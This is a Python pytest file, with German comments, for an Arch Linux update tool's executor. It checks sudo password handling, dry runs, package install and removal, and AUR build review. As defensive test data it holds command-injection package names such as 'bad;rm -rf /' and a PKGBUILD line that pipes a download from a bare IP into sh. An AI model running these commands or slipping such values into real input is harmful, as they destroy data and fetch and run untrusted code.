"""Der Update-Lauf mit gefälschtem Prozessstart: es wird nichts am System ausgeführt."""

import asyncio
import os
from pathlib import Path

import pytest

from update_planner import aur_scanner, config, executor

SECRET = 'S3cr3t-pw!'  # noqa: S105 – Testwert


class FakeStream:
    """Liefert die Ausgabe in kleinen Stücken – wie eine Pipe, Zeilen können über Stücke hinweg gehen."""

    def __init__(self, data: bytes, chunk: int = 7):
        self._data, self._chunk = data, chunk

    async def read(self, n=-1):
        out, self._data = self._data[:min(n, self._chunk)], self._data[min(n, self._chunk):]
        return out


class FakeProc:
    def __init__(self, lines, rc=0):
        self._lines = [l.encode() + b'\n' for l in lines]
        self.returncode = rc
        self.stdin = FakeStdin()
        self.stdout = FakeStream(b''.join(self._lines))

    async def wait(self):
        return self.returncode

    async def communicate(self, data=None):
        self.stdin.data += data or b''
        return b'', b''


class FakeStdin:
    def __init__(self):
        self.data = b''

    def write(self, b):
        self.data += b

    async def drain(self):
        pass

    def close(self):
        pass


@pytest.fixture
def calls(monkeypatch, tmp_path):
    monkeypatch.setattr(config, 'CACHE', tmp_path)
    monkeypatch.setattr(executor.pacman_src, 'db_locked', lambda: False)
    monkeypatch.setattr(executor.pacman_src, 'pacnew_files', lambda: [])
    seen = []

    async def fake_exec(*cmd, **kw):
        out = ['Packages (2) a-2-1 b-2-1', ':: Processing package changes...', '(1/2) upgrading a',
               '(2/2) upgrading b', 'warning: /etc/a.conf installed as /etc/a.conf.pacnew']
        proc = FakeProc(out)
        seen.append((list(cmd), proc))
        return proc

    monkeypatch.setattr(asyncio, 'create_subprocess_exec', fake_exec)
    return seen


def cbs(log):
    async def ask(*a):
        return False
    return executor.Callbacks(phase=lambda p: None, progress=lambda a, b: None, log=log.append, ask=ask)


def test_password_only_via_stdin_never_in_args_or_log(calls):
    log = []
    plan = executor.Plan(repo=True, hold=['limine'], snapshot=False)
    r = asyncio.run(executor.Runner(plan, cbs(log), SECRET, {'snap_pac': True}).run())
    assert r.ok and r.pacnew == ['/etc/a.conf.pacnew']
    cmd, proc = calls[0]
    assert cmd[:6] == ['sudo', '-S', '-k', '-p', '', '--']
    assert cmd[6:] == ['pacman', '-Syu', '--noconfirm', '--noprogressbar', '--ignore', 'limine']
    assert proc.stdin.data == (SECRET + '\n').encode()
    assert all(SECRET not in a for c, _ in calls for a in c)
    assert all(SECRET not in line for line in log)
    text = open(r.log_file).read()
    assert SECRET not in text
    assert oct(os.stat(r.log_file).st_mode & 0o777) == '0o600'


def test_dry_run_never_calls_sudo(calls):
    plan = executor.Plan(repo=True, flatpak=['org.gtk.Gtk3theme.Breeze'], dry_run=True)
    r = asyncio.run(executor.Runner(plan, cbs([]), None, {}).run())
    assert r.ok
    assert all(c[0] != 'sudo' for c, _ in calls)
    assert calls[0][0][:2] == ['pacman', '-Sup']


def test_invalid_hold_name_aborts_cleanly(calls):
    plan = executor.Plan(repo=True, hold=['ok', 'bad;rm -rf /'])
    r = asyncio.run(executor.Runner(plan, cbs([]), SECRET, {}).run())
    assert not r.ok and calls == []


def test_refuses_to_run_as_root(monkeypatch, tmp_path):
    monkeypatch.setattr(config, 'CACHE', tmp_path)
    monkeypatch.setattr(os, 'geteuid', lambda: 0)
    with pytest.raises(RuntimeError):
        executor.Runner(executor.Plan(), cbs([]), None, {})


def test_failed_pacman_aborts(monkeypatch, calls):
    async def failing(*cmd, **kw):
        return FakeProc(['error: failed to commit transaction'], rc=1)
    monkeypatch.setattr(asyncio, 'create_subprocess_exec', failing)
    r = asyncio.run(executor.Runner(executor.Plan(repo=True, flatpak=['a.b']), cbs([]), SECRET, {}).run())
    assert not r.ok and 'Flatpak' not in r.updated


def test_long_lines_and_cr_do_not_break_stream(monkeypatch, calls):
    long = 'x' * 200_000                                   # > 64 KiB: readline() wäre hier gescheitert
    async def fake(*cmd, **kw):
        p = FakeProc([])
        p.stdout = FakeStream((long + '\nfoo\rbar\r\nend').encode(), chunk=65536)
        return p
    monkeypatch.setattr(asyncio, 'create_subprocess_exec', fake)
    log = []
    r = asyncio.run(executor.Runner(executor.Plan(repo=True, snapshot=False), cbs(log), SECRET, {}).run())
    assert r.ok
    assert log[-4:-1] == ['foo', 'bar', 'end'] and len(log[-5]) <= executor.UI_LINE + 2
    assert long in Path(r.log_file).read_text()            # Protokoll vollständig


def test_broken_stdin_pipe_is_not_fatal(monkeypatch, calls):
    async def fake(*cmd, **kw):
        p = FakeProc(['sudo: a password is required'], rc=1)
        async def broken():
            raise BrokenPipeError
        p.stdin.drain = broken
        return p
    monkeypatch.setattr(asyncio, 'create_subprocess_exec', fake)
    r = asyncio.run(executor.Runner(executor.Plan(repo=True, snapshot=False), cbs([]), SECRET, {}).run())
    assert not r.ok and r.errors                            # sauberer Abbruch statt Ausnahme


def test_unexpected_error_returns_result(monkeypatch, calls):
    async def missing(*cmd, **kw):
        raise FileNotFoundError('snapper')
    monkeypatch.setattr(asyncio, 'create_subprocess_exec', missing)
    r = asyncio.run(executor.Runner(executor.Plan(repo=True, snapshot=False), cbs([]), SECRET, {}).run())
    assert not r.ok and 'FileNotFoundError' in r.errors[0]
    assert not executor.running()


def _cbs_answer(log, answer, asked):
    async def ask(title, text, yes, no):
        asked.append((title, text))
        return answer
    return executor.Callbacks(phase=lambda p: None, progress=lambda a, b: None, log=log.append, ask=ask)


def _no_sudo_cmds(calls):
    return [c[6:] for c, _ in calls if c[0] == 'sudo']


@pytest.mark.parametrize('answer', [True, False])
def test_orphans_removed_only_after_confirmation(calls, monkeypatch, answer):
    monkeypatch.setattr(executor.pacman_src, 'orphans', lambda: ['python-old', 'libfoo'])
    asked, log = [], []
    plan = executor.Plan(repo=False, snapshot=False, remove_orphans=True)
    r = asyncio.run(executor.Runner(plan, _cbs_answer(log, answer, asked), SECRET, {}).run())
    assert r.ok and len(asked) == 1 and 'python-old' in asked[0][1]
    removes = [c for c in _no_sudo_cmds(calls) if c[:2] == ['pacman', '-Rns']]
    if answer:
        assert removes == [['pacman', '-Rns', '--noconfirm', '--noprogressbar', 'python-old', 'libfoo']]
        assert r.removed == ['python-old', 'libfoo']
    else:
        assert removes == [] and r.removed == []


def test_no_question_without_orphans(calls, monkeypatch):
    monkeypatch.setattr(executor.pacman_src, 'orphans', lambda: [])
    asked = []
    plan = executor.Plan(repo=False, snapshot=False, remove_orphans=True)
    r = asyncio.run(executor.Runner(plan, _cbs_answer([], True, asked), SECRET, {}).run())
    assert r.ok and asked == [] and calls == []


def test_cache_cleanup_commands(calls):
    plan = executor.Plan(repo=False, snapshot=False, clean_cache=True, cache_keep=1)
    r = asyncio.run(executor.Runner(plan, cbs([]), SECRET, {}).run())
    assert r.ok and r.cache_cleaned
    assert _no_sudo_cmds(calls) == [['paccache', '-rk', '1'], ['paccache', '-ruk0']]
    assert 'Aufräumen' in plan.phases()


def test_cleanup_dry_run_uses_no_sudo(calls, monkeypatch):
    monkeypatch.setattr(executor.pacman_src, 'orphans', lambda: ['python-old'])
    asked = []
    plan = executor.Plan(repo=False, snapshot=False, dry_run=True, remove_orphans=True, clean_cache=True)
    r = asyncio.run(executor.Runner(plan, _cbs_answer([], True, asked), None, {}).run())
    assert r.ok and asked == [] and not r.cache_cleaned
    assert [c for c, _ in calls] == [['paccache', '-dk', '2'], ['paccache', '-duk0']]


# ------------------------------------------------------------------ neue Pakete installieren (1.3.0)

def test_repo_install_runs_full_upgrade_with_needed(calls):
    log = []
    plan = executor.Plan(repo=False, install=['htop', 'python-foo+bar'], snapshot=False)
    assert 'Repo' in plan.phases()
    r = asyncio.run(executor.Runner(plan, cbs(log), SECRET, {}).run())
    assert r.ok
    cmd, proc = calls[0]
    assert cmd[:6] == ['sudo', '-S', '-k', '-p', '', '--']
    assert cmd[6:] == ['pacman', '-Syu', '--noconfirm', '--noprogressbar', '--needed', 'htop', 'python-foo+bar']
    assert proc.stdin.data == (SECRET + '\n').encode()                 # Passwort nur über stdin
    assert all(SECRET not in a for c, _ in calls for a in c)
    assert all(SECRET not in line for line in log) and SECRET not in open(r.log_file).read()


def test_repo_install_dry_run_has_no_sudo(calls):
    plan = executor.Plan(repo=False, install=['htop'], dry_run=True)
    r = asyncio.run(executor.Runner(plan, cbs([]), None, {}).run())
    assert r.ok and all(c[0] != 'sudo' for c, _ in calls)
    assert calls[0][0][:2] == ['pacman', '-Sup'] and '--needed' in calls[0][0] and calls[0][0][-1] == 'htop'


@pytest.mark.parametrize('field, value', [
    ('install', ['ok', 'bad;rm -rf /']),
    ('aur', [('ok', 'bad name')]),
    ('flatpak_install', ['org.ok.App', 'bad id; rm']),
])
def test_install_names_are_validated(calls, field, value):
    plan = executor.Plan(repo=False, snapshot=False, **{field: value})
    r = asyncio.run(executor.Runner(plan, cbs([]), SECRET, {}).run())
    assert not r.ok and calls == []                                  # nichts gestartet


@pytest.mark.parametrize('user, flag', [(True, '--user'), (False, '--system')])
def test_flatpak_install_arguments(calls, user, flag):
    plan = executor.Plan(repo=False, snapshot=False, flatpak_install=['org.gimp.GIMP'], flatpak_user=user)
    assert 'Flatpak' in plan.phases() and 'Repo' not in plan.phases()
    r = asyncio.run(executor.Runner(plan, cbs([]), None, {}).run())
    assert r.ok
    # systemweit ohne --noninteractive, sonst unterdrückt es den Polkit-Dialog; als Benutzer ohne Rückfragen
    expected = ['flatpak', 'install', '-y', *(['--noninteractive'] if user else []), flag, 'flathub', 'org.gimp.GIMP']
    assert [c for c, _ in calls] == [expected]
    assert all(c[0] != 'sudo' for c, _ in calls)                      # als Benutzer, polkit fragt Flatpak selbst


def test_flatpak_install_dry_run_runs_nothing(calls):
    plan = executor.Plan(repo=False, snapshot=False, dry_run=True, flatpak_install=['org.gimp.GIMP'])
    r = asyncio.run(executor.Runner(plan, cbs([]), None, {}).run())
    assert r.ok and calls == []


class _Built(list):
    """Gebaute Paketdateien plus Hash des geprüften PKGBUILD."""
    review_hash = ''


def _aur_env(monkeypatch, tmp_path):
    build = tmp_path / 'aur'
    d = build / 'foo'
    (d / '.git').mkdir(parents=True)
    text = "pkgname=foo\nsource=('https://example.org/foo.tar.gz')\nsha256sums=('" + 'a' * 64 + "')\nb2sums=('SKIP')\n"
    (d / 'PKGBUILD').write_text(text)
    pkgs = _Built([d / 'foo-1-1-x86_64.pkg.tar.zst', d / 'foo-debug-1-1-x86_64.pkg.tar.zst'])
    for p in pkgs:
        p.write_text('x')
    monkeypatch.setattr(config, 'AUR_BUILD', build)

    def fake_text(cmd, cwd, ok=(0,), env=None):
        if cmd[:2] == ['makepkg', '--printsrcinfo']:
            return ''
        if cmd[:2] == ['makepkg', '--packagelist']:
            return '\n'.join(map(str, pkgs))
        if cmd[:2] == ['pacman', '-Qq']:
            return 'bash\nglibc\n'
        if cmd[:2] == ['pacman', '-Qqp']:
            return 'foo-debug\n' if 'debug' in cmd[2] else 'foo\n'
        raise AssertionError(cmd)
    monkeypatch.setattr(executor, '_run_text', fake_text)
    pkgs.review_hash = aur_scanner.review_hash([text])      # Fingerabdruck des „geprüften“ PKGBUILD
    return pkgs


def test_aur_new_install_picks_wanted_package(calls, monkeypatch, tmp_path):
    pkgs = _aur_env(monkeypatch, tmp_path)
    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'}, reviewed={'foo': pkgs.review_hash})
    r = asyncio.run(executor.Runner(plan, _cbs_answer([], True, []), SECRET, {}).run())
    assert r.ok and r.updated == ['foo']
    installs = [c for c in _no_sudo_cmds(calls) if c[:2] == ['pacman', '-U']]
    assert installs == [['pacman', '-U', '--noconfirm', '--noprogressbar', str(pkgs[0])]]   # nur foo, nicht foo-debug


def test_aur_update_of_not_installed_package_is_skipped(calls, monkeypatch, tmp_path):
    pkgs = _aur_env(monkeypatch, tmp_path)        # „foo“ ist nicht installiert → als Update gibt es nichts zu tun
    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], reviewed={'foo': pkgs.review_hash})
    r = asyncio.run(executor.Runner(plan, _cbs_answer([], True, []), SECRET, {}).run())
    assert r.skipped == ['foo'] and not any(c[:2] == ['pacman', '-U'] for c in _no_sudo_cmds(calls))


def test_flatpak_install_never_updates_other_apps(calls):
    plan = executor.Plan(repo=False, snapshot=False, flatpak_install=['org.a.A'], flatpak_user=True)
    asyncio.run(executor.Runner(plan, cbs([]), None, {}).run())
    assert all(c[1] != 'update' for c, _ in calls) and len(calls) == 1


def test_plan_kind_names_the_action():
    assert executor.Plan().kind() == 'update'
    assert executor.Plan(repo=False, flatpak_install=['a.b']).kind() == 'install'
    assert executor.Plan(repo=False, install=['htop']).kind() == 'install'
    assert executor.Plan(repo=False, remove=['htop']).kind() == 'remove'
    assert 'Entfernen' in executor.Plan(repo=False, remove=['htop']).phases()
    assert 'Entfernen' in executor.Plan(repo=False, flatpak_remove=['a.b']).phases()


@pytest.mark.parametrize('configs, flags', [(False, '-Rs'), (True, '-Rns')])
def test_remove_runs_pacman_with_sudo_and_stdin_password(calls, configs, flags):
    plan = executor.Plan(repo=False, snapshot=False, remove=['htop', 'btop'], remove_configs=configs)
    r = asyncio.run(executor.Runner(plan, cbs([]), SECRET, {}).run())
    assert r.ok and r.updated == ['Entfernen']
    cmd, proc = calls[0]
    assert cmd[:6] == ['sudo', '-S', '-k', '-p', '', '--']
    assert cmd[6:] == ['pacman', flags, '--noconfirm', '--noprogressbar', 'htop', 'btop']
    assert proc.stdin.data == (SECRET + '\n').encode() and all(SECRET not in a for c, _ in calls for a in c)


def test_remove_dry_run_is_read_only(calls):
    plan = executor.Plan(repo=False, snapshot=False, dry_run=True, remove=['htop'], flatpak_remove=['org.a.A'])
    r = asyncio.run(executor.Runner(plan, cbs([]), None, {}).run())
    assert r.ok and all(c[0] != 'sudo' for c, _ in calls)
    assert calls[0][0][:2] == ['pacman', '-Rsp'] and len(calls) == 1          # Flatpak wird nur protokolliert


def test_remove_dry_run_reports_broken_dependencies(monkeypatch, calls):
    async def fake(*cmd, **kw):
        return FakeProc(["checking dependencies...", ":: removing glibc breaks dependency 'glibc' required by zstd"])
    monkeypatch.setattr(asyncio, 'create_subprocess_exec', fake)
    plan = executor.Plan(repo=False, snapshot=False, dry_run=True, remove=['glibc'])
    r = asyncio.run(executor.Runner(plan, cbs([]), None, {}).run())
    assert not r.ok and 'zstd' in r.errors[0]


@pytest.mark.parametrize('user, expected', [
    (True, ['flatpak', 'uninstall', '-y', '--noninteractive', '--user', '--delete-data', 'org.a.A']),
    (False, ['flatpak', 'uninstall', '-y', '--system', 'org.a.A']),
])
def test_flatpak_remove_arguments(calls, user, expected):
    plan = executor.Plan(repo=False, snapshot=False, flatpak_remove=['org.a.A'], flatpak_remove_user=user,
                         flatpak_remove_data=user)
    r = asyncio.run(executor.Runner(plan, cbs([]), None, {}).run())
    assert r.ok and [c for c, _ in calls] == [expected]


@pytest.mark.parametrize('field, value', [('remove', ['ok', '-Rdd']), ('flatpak_remove', ['--user'])])
def test_remove_names_are_validated(calls, field, value):
    r = asyncio.run(executor.Runner(executor.Plan(repo=False, snapshot=False, **{field: value}), cbs([]), SECRET, {}).run())
    assert not r.ok and calls == []


def test_aur_review_applies_only_to_the_reviewed_content(calls, monkeypatch, tmp_path):
    """Ein auffälliges PKGBUILD wird nur ohne Rückfrage gebaut, wenn es genau das geprüfte ist."""
    pkgs = _aur_env(monkeypatch, tmp_path)
    (tmp_path / 'aur' / 'foo' / 'PKGBUILD').write_text("pkgname=foo\ncurl -s http://1.2.3.4/x | sh\n")   # neu, verdächtig
    for name, hashes, expect_ask in (('geändert', {'foo': pkgs.review_hash}, True), ('ohne Freigabe', {}, True)):
        asked, log = [], []
        plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'}, reviewed=hashes)
        r = asyncio.run(executor.Runner(plan, _cbs_answer(log, False, asked), SECRET, {}).run())
        assert bool(asked) is expect_ask and r.skipped == ['foo'], name
        if hashes:
            assert any('seit der manuellen Prüfung geändert' in line for line in log)
    # passende Freigabe: dieselbe Datei, kein Nachfragen
    text = (tmp_path / 'aur' / 'foo' / 'PKGBUILD').read_text()
    asked = []
    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'},
                         reviewed={'foo': aur_scanner.review_hash([text])})
    r = asyncio.run(executor.Runner(plan, _cbs_answer([], False, asked), SECRET, {}).run())
    assert asked == [] and r.updated == ['foo']


def test_review_hash_is_content_based_and_order_independent():
    assert aur_scanner.review_hash(['a', 'b']) == aur_scanner.review_hash(['b', 'a'])
    assert aur_scanner.review_hash(['a']) != aur_scanner.review_hash(['a ']) != aur_scanner.review_hash(['a', 'b'])
